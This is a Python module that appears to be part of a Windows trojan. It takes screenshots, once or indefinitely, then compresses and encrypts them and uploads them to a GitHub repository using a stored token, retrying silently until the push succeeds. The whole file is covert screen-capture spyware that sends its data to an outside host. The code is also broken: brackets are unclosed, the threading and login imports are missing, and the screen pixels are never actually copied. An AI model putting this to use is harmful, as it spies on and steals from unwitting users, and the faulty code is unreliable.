#takes screenshots on windows
#with no arguments it just takes a screenshot and returns
#optionally can take multiple screen shots
#shots gives number of shots to take, if negative take shots indefinately
#delay gives the space between shots
#push, if true push each shot to github as taken (manidtory for indefinite shots), if false, store shots as json and push when finished
#still need to figure out how to get image after downloading bits as string

#uses pywin32
import win32gui
import win32ui
import win32con
import win32api
import json
import time
import zlib
import base64

def scap():
	#get handle to main desktop window
	hdesktop = win32gui.GetDesktopWindow()
	
	#determine size of monitors
	width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
	height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
	
	#create a device context
	desktop_dc = win32gui.GetWindowDC(hdesktop)
	img_dc = win32ui.CreateDCFromHandle(desktop_dc)
	
	#create a bitmap object
	screenshot = win32ui.CreateBitmap()
	screenshot.CreateCompatibleBitmap(img_dc, width, height)

	#get bits as string
	bits = screenshot.GetBitmapBits(True)
	
	#free our object
	win32gui.DeleteObject(screenshot.GetHandle())

	return bits

def push_data(config, data): #need to update with random identifiers
	while True:
		try:
			gh = login(token = config.g_token())
	        	repo = gh.repository(config.g_usr(), config.g_repo())
		        repo.create_file(config.g_data(), config.g_com(), 
						encrypt(data, config)
			break
		except:
			time.sleep(config.g_slp()) #keep string until we can push
	return

def encrypt(data, config):
        key = config.pk
        size = config.size
        offset = 0
        encrypted = ""
        compressed = zlib.compress(data)
        while offset < len(compressed):
                chunk = compressed[offset:offset+size]
                encrypted += key.encrypt(chunk)
                offset += size
        return base64.b64encode(encrypted)

def run(config, **args):
	try:
		shots = args["shots"]
	except:
		shots = 1
	try:
		delay = args["delay"]
	except:
		delay = 5
	try:
		push = args["push"]
	except:
		push = False

	if shots > 1:
		caps = []
		for i in range(shots):
			cap = scap()
			if push:
				t = threading.Thread(target = push_data, 
							args = (config, cap)
				t.start()
			else:
				caps.append(cap)
			if i < shots - 1: #dont sleep after last shot
				time.sleep(delay)
		if not push:
			js = json.dumps(caps)
			return None, caps
	if shots == 1:
		cap = scap()
		return None, cap
	else: #negative shots, take shots indefinately
		while True:
			cap = scap()
			push_data(config, cap) #thread
			time.sleep(delay)

	return None, None #only hit if were pushing finite amount of caps
